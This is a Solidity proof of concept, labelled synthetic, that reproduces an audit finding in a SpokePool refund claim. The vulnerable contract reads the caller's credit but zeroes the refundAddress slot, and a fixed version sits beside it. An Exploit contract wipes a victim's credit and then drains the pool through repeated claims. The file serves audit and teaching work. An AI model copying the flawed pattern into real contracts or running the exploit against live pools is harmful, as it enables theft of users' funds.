// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Across SpokePool.claimRelayerRefund (OpenZeppelin, AuditVault #56784).
    SYNTHETIC, cheatcode-free, single transaction.

    The refund is read from relayerRefund[token][msg.sender], but the slot
    that is zeroed is relayerRefund[token][refundAddress]. A relayer whose
    own credit is never cleared can pull that credit on every call, and can
    zero someone else's credit by passing their address as refundAddress. */

interface IMini {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function mint(address, uint256) external;
}

contract Mini {
    string public constant name = "Relayer USD";
    string public constant symbol = "RUSD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SpokePool {
    Mini public immutable token;
    mapping(address => mapping(address => uint256)) public relayerRefund;

    constructor(Mini token_) {
        token = token_;
    }

    /// @dev Stands in for a filled relay recording an outstanding refund.
    function recordRefund(address relayer, uint256 amount) external {
        relayerRefund[address(token)][relayer] += amount;
    }

    function refundOf(address relayer) external view returns (uint256) {
        return relayerRefund[address(token)][relayer];
    }

    /// @dev Audited body. The zeroed key is refundAddress, not msg.sender.
    function claimRelayerRefund(address l2TokenAddress, address refundAddress) external {
        uint256 refundAmount = relayerRefund[l2TokenAddress][msg.sender];
        require(refundAmount > 0, "no refund");
        relayerRefund[l2TokenAddress][refundAddress] = 0;
        // @> VULN: zeroes refundAddress, not msg.sender, so the caller's credit survives
        IMini(l2TokenAddress).transfer(refundAddress, refundAmount);
    }
}

contract SpokePoolFixed {
    Mini public immutable token;
    mapping(address => mapping(address => uint256)) public relayerRefund;

    constructor(Mini token_) {
        token = token_;
    }

    function recordRefund(address relayer, uint256 amount) external {
        relayerRefund[address(token)][relayer] += amount;
    }

    function claimRelayerRefund(address l2TokenAddress, address refundAddress) external {
        uint256 refundAmount = relayerRefund[l2TokenAddress][msg.sender];
        require(refundAmount > 0, "no refund");
        relayerRefund[l2TokenAddress][msg.sender] = 0;
        IMini(l2TokenAddress).transfer(refundAddress, refundAmount);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x2222222222222222222222222222222222222222;
    uint256 internal constant CREDIT = 100 ether;
    uint256 internal constant VICTIM_CREDIT = 900 ether;

    Mini public token;
    SpokePool public pool;
    uint256 public victimRefundBefore;
    uint256 public victimRefundAfter;
    uint256 public attackerCreditAfterGrief;
    uint256 public haulAfterTwo;
    uint256 public attackerHaul;
    uint256 public poolLeft;
    uint256 public victimTokens;

    function run() external {
        token = new Mini();
        pool = new SpokePool(token);
        token.mint(address(pool), CREDIT + VICTIM_CREDIT);
        pool.recordRefund(address(this), CREDIT);
        pool.recordRefund(VICTIM, VICTIM_CREDIT);
        victimRefundBefore = pool.refundOf(VICTIM);
        pool.claimRelayerRefund(address(token), VICTIM);
        victimRefundAfter = pool.refundOf(VICTIM);
        attackerCreditAfterGrief = pool.refundOf(address(this));
        pool.claimRelayerRefund(address(token), ATTACKER);
        pool.claimRelayerRefund(address(token), ATTACKER);
        haulAfterTwo = token.balanceOf(ATTACKER);
        pool.claimRelayerRefund(address(token), ATTACKER);
        pool.claimRelayerRefund(address(token), ATTACKER);
        pool.claimRelayerRefund(address(token), ATTACKER);
        pool.claimRelayerRefund(address(token), ATTACKER);
        pool.claimRelayerRefund(address(token), ATTACKER);
        pool.claimRelayerRefund(address(token), ATTACKER);
        pool.claimRelayerRefund(address(token), ATTACKER);
        attackerHaul = token.balanceOf(ATTACKER);
        poolLeft = token.balanceOf(address(pool));
        victimTokens = token.balanceOf(VICTIM);
    }
}
